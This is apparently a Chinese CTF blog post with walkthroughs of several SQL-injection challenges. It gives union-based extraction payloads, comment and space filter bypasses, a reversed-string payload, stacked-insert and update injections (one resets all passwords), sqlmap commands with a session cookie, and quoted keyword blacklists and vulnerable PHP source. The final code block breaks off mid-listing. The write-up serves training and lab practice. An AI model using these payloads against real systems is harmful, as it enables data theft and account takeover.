<p>很明显创建了虚拟数据（虚拟字段值123和虚拟表），虚拟表中列名变成了123。</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B904%E5%88%86.png" alt="image-20240806200442297"></p>
<p>很明显创建了虚拟数据（虚拟字段值123和虚拟表），虚拟表中列名变成了123。</p>
<p>只查一列的字段的值我们可以 yyy是自己命名的虚拟表表名，可以自定义这条sql语句在联合查询创建虚拟表xxx，虚拟列1,2,3的同时查询虚拟表第二列的数据。</p>
<p>select <code>2</code> from (select 1,2,3 union select * from Gu0f3n)yyy;</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B909%E5%88%86.png" alt="image-20240806200938012"></p>
<p>要查多个列的话</p>
<p>select <code>2</code> ,<code>3</code>from (select 1,2,3 union select * from Gu0f3n)yyy;</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B911%E5%88%86.png" alt="image-20240806201127902"></p>
<p>如果有时候把&#96;过滤了我们可以用as</p>
<p>select 1 as a,2 as b, 3 as c union select * from Gu0f3n;</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B914%E5%88%86.png" alt="image-20240806201353981"></p>
<p>select b from (select 1 as a,2 as b,3 as c union select * from Gu0f3n)yyy;</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B915%E5%88%86.png" alt="image-20240806201450310"></p>
<h2 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h2><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B916%E5%88%86.png" alt="image-20240806201644950"></p>
<p>黑名单应该是这样的<code>&quot;/and|sleep|extractvalue|information|is|not|updataxml|order|rand|handler|flag|sleep|\~|\!|\@|\#|\\$|\%|\^|\+|\&amp;|\-|\ /i&quot;</code></p>
<p>判断类型</p>
<p>因为注释符号都过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;|&#x27;1</span><br></pre></td></tr></table></figure>

<p>发现回显和id&#x3D;1一样确定是字符型</p>
<p>空格&#x2F;**&#x2F;绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;/**/group/**/by/**/3,&#x27;1</span><br></pre></td></tr></table></figure>

<p>发现字段为3</p>
<p>判断回显位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,3/**/where&#x27;1</span><br></pre></td></tr></table></figure>

<p>这里where是限制条件 目的还是注释掉闭合</p>
<p>发现回显位置为3</p>
<p>爆库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where&#x27;1</span><br></pre></td></tr></table></figure>

<p>得到这些库名</p>
<p>ctf,ctftraining,ctftraining,ctftraining,mysql</p>
<p>爆表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where&#x27;1</span><br></pre></td></tr></table></figure>

<p>得到这些表名</p>
<p>ccctttfff,flag,news,users,gtid_slave_pos</p>
<p>上面说过 不能得到列名 我们直接爆值</p>
<p>还得自己一个个试</p>
<p>最终flag 在ctftraining.flag下面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,`6`/**/from/**/(select/**/6/**/union/**/select/**/*/**/from/**/ctftraining.flag)Gu0f3n/**/where&#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A521%E7%82%B907%E5%88%86.png" alt="image-20240806210746263"></p>
<p>还有有一种闭合方式%00</p>
<p>其他都一样</p>
<h1 id="MoeCTF-2022-Sqlmap-boy"><a href="#MoeCTF-2022-Sqlmap-boy" class="headerlink" title="[MoeCTF 2022]Sqlmap_boy"></a>[MoeCTF 2022]Sqlmap_boy</h1><p>万能密码成功进入</p>
<p>admin” or 1&#x3D;1#</p>
<p>发现注入点 id 闭合方式为单引号字段为3</p>
<p>回显为为 2，3</p>
<p>当前库名为moectf</p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>

<p>articles,flag,users</p>
<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=database()--+</span><br></pre></td></tr></table></figure>

<p>flAg</p>
<p>爆值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27; union select 1,group_concat(flAg),3 from flag--+</span><br></pre></td></tr></table></figure>

<p>NSSCTF{75b86f27-423b-418f-ac60-08815140a910}</p>
<h1 id="HUBUCTF-2022-新生赛-ezsql"><a href="#HUBUCTF-2022-新生赛-ezsql" class="headerlink" title="[HUBUCTF 2022 新生赛]ezsql"></a>[HUBUCTF 2022 新生赛]ezsql</h1><p>这题提示获得admin的密码</p>
<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><p>参考文章：<a href="https://blog.csdn.net/qq_35599248/article/details/122440184">https://blog.csdn.net/qq_35599248/article/details/122440184</a></p>
<p>我们常见的<a href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">sql注入</a>一般都是基于select语句，但是在update，insert，delete也可以注入。</p>
<p>他们的原理都是当执行时遇到 (表达式1)(and&#x2F;or)(表达式2) ，这种形式的式子时，前后表达式前后都会执行，然后做逻辑运算，最后的结果要么0，要么1。</p>
<p>假如我们sql注入的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; AND 3666=3666 AND ′Gu0f3n&#x27;=&#x27;Gu0f3n</span><br></pre></td></tr></table></figure>

<p>SQL查询会变成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; AND 3666=3666 AND &#x27;Gu0f3n&#x27;=&#x27;Gu0f3n&#x27;</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>id&#x3D;’1’</strong>:<ul>
<li>这个部分将 <code>id</code> 设为 <code>1</code>，并闭合了引号。此时，<code>id</code> 的值实际上为 <code>&#39;1&#39;</code>。</li>
</ul>
</li>
<li><strong>AND 3666&#x3D;3666</strong>:<ul>
<li>这是一个恒真条件，因为3666总是等于3666。这个条件保证了注入部分的合法性，并且在逻辑上不改变查询的结果。</li>
</ul>
</li>
<li><strong>AND ‘Gu0f3n’&#x3D;’Gu0f3n’</strong>:<ul>
<li>这是另一个恒真条件，因为<code>Gu0f3n</code>总是等于<code>Gu0f3n</code>。这进一步确保了查询的合法性。</li>
</ul>
</li>
</ol>
<h3 id="中间插入表达式的位"><a href="#中间插入表达式的位" class="headerlink" title="中间插入表达式的位"></a>中间插入表达式的位</h3><p>这种注入方法的关键在于引入两个恒真条件，使得查询语句在逻辑上始终为真。这种情况下，我们可以在中间的表达式位插入任意的SQL语句，而不会引起语法错误或逻辑错误。</p>
<h3 id="具体例子"><a href="#具体例子" class="headerlink" title="具体例子"></a>具体例子</h3><p>假设我们希望通过SQL注入来查询数据库的版本信息，构造如下的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; AND 3362=3362 AND (SELECT version())=&#x27;Gu0f3n&#x27;</span><br></pre></td></tr></table></figure>

<p>这个查询会变成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; AND 3362=3362 AND (SELECT version())=&#x27;Gu0f3n&#x27;</span><br></pre></td></tr></table></figure>

<p>下面来说一下<a href="https://so.csdn.net/so/search?q=insert&spm=1001.2101.3001.7020">insert</a>，update，delete的注入。</p>
<h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><p>insert语句的格式一般为<br>insert into <teable_name> values (,,,…);<br>当我们发现后面插入值的<strong>某个位置我们可控</strong>时，就可以把那个位置改成多个逻辑连接词的形式，同时insert注入还可以帮助我们任意注册账号。因为插入语句要求我们插入位置的数据类型相同，所以我们要我们可控的位置的数据类型一般都是数值.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into Gu0f3n values(1 and if(1&gt;2,0,sleep(3)),&#x27;shell&#x27;,&#x27;Gu0f3n&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A509%E7%82%B950%E5%88%86.png" alt="image-20240807094926093"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into Gu0f3n values(1 and updatexml(1,(select concat(0x7e,version())),3),&#x27;shell&#x27;,&#x27;Gu0f3n&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A509%E7%82%B956%E5%88%86.png" alt="image-20240807095633287"></p>
<h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p>格式</p>
<p>update <table_name> set column &#x3D; where &lt;条件&gt;</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A510%E7%82%B912%E5%88%86.png" alt="image-20240807101214936"></p>
<h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>delete from <table_name> where &lt;条件&gt;<br>原理还是和上面一样，只是这个要注意一下不要把数据库里面的内容删了，所以一定要保持最后逻辑表达式的结果为假。or连接词慎用。</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A510%E7%82%B914%E5%88%86.png" alt="image-20240807101426609"></p>
<h3 id="回到题目-1"><a href="#回到题目-1" class="headerlink" title="回到题目"></a>回到题目</h3><p>admin弱口令爆破不出</p>
<p>万能密码没试出来</p>
<p>扫目录发现源码泄露</p>
<p>发现update.php</p>
<p>存在sql注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query<span class="operator">=</span>$mysqli<span class="operator">-</span><span class="operator">&gt;</span>query(&quot;update users set age=$_POST[age],nickname=&#x27;$_POST[nickname]&#x27;,description=&#x27;$_POST[description]&#x27; where id=$_SESSION[id]&quot;);</span><br></pre></td></tr></table></figure>

<p>注入点在age这里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3n&amp;age=-1,description=(select database())#&amp;description=ss&amp;token=294e68dc4639816cda6dea96ca92603d</span><br></pre></td></tr></table></figure>

<p>爆出库名</p>
<p>demo2</p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3b&amp;age=-1,description=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;description=sss&amp;token=3ac68ca374a43cc099684f4353f5284d</span><br></pre></td></tr></table></figure>

<p>users</p>
<p>爆列</p>
<p>发现这里将单引号过滤了 </p>
<p>将users转16进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3b&amp;age=-1,description=(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=database())#&amp;description=sss&amp;token=3ac68ca374a43cc099684f4353f5284d</span><br></pre></td></tr></table></figure>

<p>id,username,password,nickname,age,description</p>
<p>得到这些列</p>
<p>看到密码拿密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3b&amp;age=-1,description=(select group_concat(password) users)#&amp;description=sss&amp;token=3ac68ca374a43cc099684f4353f5284d</span><br></pre></td></tr></table></figure>

<p>MD5存储</p>
<p>3691308f2a4c2f6983f2880d32e29c84</p>
<p>更新所有密码(aaa)</p>
<p>nickname&#x3D;Gu0f3b&amp;age&#x3D;11,password&#x3D;0x3437626365356337346635383966343836376462643537653963613966383038#&amp;description&#x3D;sss&amp;token&#x3D;3ac68ca374a43cc099684f4353f5284d</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A511%E7%82%B957%E5%88%86.png" alt="image-20240807115708531"></p>
<p>给了段md5</p>
<p>解密发现是iamcool</p>
<p>重启靶机</p>
<p>登录admin&#x2F;iamcool</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A511%E7%82%B959%E5%88%86.png" alt="image-20240807115943261"></p>
<h1 id="NSSCTF-2022-Spring-Recruit-babysql"><a href="#NSSCTF-2022-Spring-Recruit-babysql" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babysql"></a>[NSSCTF 2022 Spring Recruit]babysql</h1><p>过滤</p>
<p>hacker!!black_list is &#x2F;if|and|\s|#|–&#x2F;i 单引号闭合</p>
<p>%00绕过 空格&#x2F;**&#x2F;</p>
<p>字段一位</p>
<p>暴库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/database();%00</span><br></pre></td></tr></table></figure>

<p>test</p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database();%00</span><br></pre></td></tr></table></figure>

<p>string(10) “flag,users”</p>
<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;;%00</span><br></pre></td></tr></table></figure>

<p>string(4) “flag”</p>
<p>爆值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(flag)/**/from/**/flag;%00</span><br></pre></td></tr></table></figure>

<p>string(63) “前有巨大宝箱,NSSCTF{629ea8c3-1d54-4eda-a425-dbb573cf61df}”</p>
<h1 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="[October 2019]Twice SQL Injection"></a>[October 2019]Twice SQL Injection</h1><p>注册登录进去</p>
<p>发现输进去的东西被转义</p>
<p>这个页面放弃</p>
<p>登录页面估计也不行</p>
<p>注册页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select database() # /123456</span><br></pre></td></tr></table></figure>

<p>闭合方式为’’</p>
<p>然后在登录发现爆库名</p>
<p>ctftraining</p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=database() # </span><br></pre></td></tr></table></figure>

<p>flag,news,users</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=database() # </span><br></pre></td></tr></table></figure>

<p>flag</p>
<p>爆值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(flag) from flag # </span><br></pre></td></tr></table></figure>

<p>NSSCTF{fe961858-8992-45d4-99a6-2b1427517f09}</p>
<h1 id="UUCTF-2022-新生赛-ezsql"><a href="#UUCTF-2022-新生赛-ezsql" class="headerlink" title="[UUCTF 2022 新生赛]ezsql"></a>[UUCTF 2022 新生赛]ezsql</h1><p>输入万能密码</p>
<p>admin‘) or 1&#x3D;1;#</p>
<p>发现被反转了了而且or被过滤了</p>
<p>&#x2F;&#x2F;<em>your sql:SELECT * FROM users WHERE passwd&#x3D;(‘’) AND username&#x3D;(‘#;1&#x3D;1 )���nimda’) LIMIT 0,1</em></p>
<p><a href="https://www.abcdtools.com/reverse">https://www.abcdtools.com/reverse</a></p>
<p>输入反转后的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;1=1 ro ) &#x27;nimda</span><br></pre></td></tr></table></figure>

<p>发现登录进去了</p>
<p>判断字段回显位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;2,1 tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>

<p>两位 12</p>
<p>爆库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad,1 tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>

<p>UUCTF</p>
<p>or被过滤 爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad=amehcs_elbat erehw selbat.amehcs_noitamrofni moorrf )(esabatad,)eman_elbat(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>

<p>flag,users</p>
<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad=amehcs_elbat dna &#x27;galf&#x27;=eman_elbat erehw snmuloc.amehcs_noitamrofni moorrf )(esabatad,)eman_nmuloc(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>

<p>UUCTF</p>
<p>保值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;galf moorrf )(esabatad,)FTCUU(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>

<p>&#x2F;&#x2F;Your Login name:NSSCTF{53358f22-a9b8-4397-99bd-a381194cc0d2}<br>&#x2F;&#x2F;Your Password:UUCTF</p>
<h1 id="HNCTF-2022-WEEK4-fun-sql"><a href="#HNCTF-2022-WEEK4-fun-sql" class="headerlink" title="[HNCTF 2022 WEEK4]fun_sql"></a>[HNCTF 2022 WEEK4]fun_sql</h1><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$uname</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|left|extractvalue|floor|reverse|update|between|flag|=|&gt;|&lt;|and|\||right|substr|replace|char|&amp;|\\\$|0x|sleep|\#/i&quot;</span>,<span class="variable">$uname</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM ccctttfff WHERE uname=&#x27;<span class="subst">$uname</span>&#x27;;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$db</span>, <span class="variable">$sql</span>);</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$db</span>);</span><br><span class="line">  <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>] === <span class="variable">$uname</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>源码直接给出过滤的字符</p>
<p>1’’1注释闭合字符</p>
<p>暴力查字段 发现三段 都有回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=0&#x27;union/**/select/**/1,2,3&#x27;1</span><br></pre></td></tr></table></figure>

<p>暴库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=0&#x27;union/**/select/**/1,database(),3&#x27;1</span><br></pre></td></tr></table></figure>

<p>ctf</p>
<ul>
<li><p><strong><code>/regexp|left|extractvalue|floor|reverse|update|between|flag|=|&gt;|&lt;|and|\||right|substr|replace|char|&amp;|\\\$|0x|sleep|\#/i</code></strong></p>
<p>这个正则表达式包含了多个关键词和符号，每个关键词或符号之间用 <code>|</code> 分隔，表示“或”关系。正则表达式中的每个部分分别匹配如下内容：</p>
<ol>
<li><strong><code>regexp</code></strong>: 匹配字符串 <code>regexp</code>。</li>
<li><strong><code>left</code></strong>: 匹配字符串 <code>left</code>。</li>
<li><strong><code>extractvalue</code></strong>: 匹配字符串 <code>extractvalue</code>。</li>
<li><strong><code>floor</code></strong>: 匹配字符串 <code>floor</code>。</li>
<li><strong><code>reverse</code></strong>: 匹配字符串 <code>reverse</code>。</li>
<li><strong><code>update</code></strong>: 匹配字符串 <code>update</code>。</li>
<li><strong><code>between</code></strong>: 匹配字符串 <code>between</code>。</li>
<li><strong><code>flag</code></strong>: 匹配字符串 <code>flag</code>。</li>
<li><strong><code>=</code></strong>: 匹配等号 <code>=</code>。</li>
<li><strong><code>&gt;</code></strong>: 匹配大于号 <code>&gt;</code>。</li>
<li><strong><code>&lt;</code></strong>: 匹配小于号 <code>&lt;</code>。</li>
<li><strong><code>and</code></strong>: 匹配字符串 <code>and</code>。</li>
<li><strong><code>\|</code></strong>: 匹配竖线符号 <code>|</code>。</li>
<li><strong><code>right</code></strong>: 匹配字符串 <code>right</code>。</li>
<li><strong><code>substr</code></strong>: 匹配字符串 <code>substr</code>。</li>
<li><strong><code>replace</code></strong>: 匹配字符串 <code>replace</code>。</li>
<li><strong><code>char</code></strong>: 匹配字符串 <code>char</code>。</li>
<li><strong><code>&amp;</code></strong>: 匹配符号 <code>&amp;</code>。</li>
<li><strong><code>\\$</code></strong>: 匹配美元符号 <code>$</code>，需要双反斜杠来转义。</li>
<li><strong><code>0x</code></strong>: 匹配十六进制前缀 <code>0x</code>。</li>
<li><strong><code>sleep</code></strong>: 匹配字符串 <code>sleep</code>。</li>
<li><strong><code>\#</code></strong>: 匹配井号 <code>#</code>。</li>
</ol>
</li>
<li><p><strong><code>/i</code></strong></p>
<p>这个模式修饰符表示不区分大小写匹配。</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>] === <span class="variable">$uname</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>单拿出来</p>
<ul>
<li><code>if ($row[1] === $uname)</code>: 检查 <code>$row</code> 数组中索引为 <code>1</code> 的元素是否等于 <code>$uname</code>。</li>
<li><code>die($flag);</code>: 如果相等，则终止脚本执行并输出 <code>$flag</code> 的值。</li>
</ul>
<p>我们直接插入一段自定义的列进去然后让uname等于我们自定义的列即可</p>
<p>之前讲过的insert注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=0&#x27;union/**/select/**/1,database(),3;insert/**/into/**/ccctttfff/**/values(&#x27;ss&#x27;,&#x27;Gu0f3n&#x27;,&#x27;1&#x27;);&#x27;1</span><br></pre></td></tr></table></figure>

<p>之后让uname&#x3D;Gu0f3n</p>
<p>NSSCTF{f87847e6-6220-417c-9b7b-2db8d9b5e9fb}</p>
<h1 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h1><p>存在二次注入</p>
<p>首先随便创建一个账号进入修改密码</p>
<p>查看源码</p>
<p> “ update user set password&#x3D;’%s’ where username&#x3D;’%s’; ”</p>
<p>那么我们只要创建一个admin’–+就可以绕过闭合</p>
<p>之后修改自己想要的密码登录admin</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A516%E7%82%B945%E5%88%86.png" alt="image-20240807164508710"></p>
<p>查询就两个回显 </p>
<p>exist 和no user </p>
<p>说明能够执行但没回显，没报错</p>
<p>考虑盲注</p>
<p>sqlmap试试</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A516%E7%82%B958%E5%88%86.png" alt="image-20240807165800615"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>node4.anna.nssctf.cn:<span class="number">28285</span><span class="operator">/</span>query <span class="comment">--data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27;</span></span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28285/query --data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27; --tables</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A517%E7%82%B900%E5%88%86.png" alt="image-20240807165948914"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28285/query --data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27; --columns</span><br></pre></td></tr></table></figure>

<p>爆列</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A517%E7%82%B901%E5%88%86.png" alt="image-20240807170149812"></p>
<p>爆值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28285/query --data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27; -T flag -C flag --dump</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A517%E7%82%B903%E5%88%86.png" alt="image-20240807170351944"></p>
<p>NSSCTF{68025097-def3-4ea7-9dda-af4b16c6f1a4}</p>
<h1 id="NSSRound-3-Team-This1sMysql"><a href="#NSSRound-3-Team-This1sMysql" class="headerlink" title="[NSSRound#3 Team]This1sMysql"></a>[NSSRound#3 Team]This1sMysql</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;config&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;config&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;config&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span 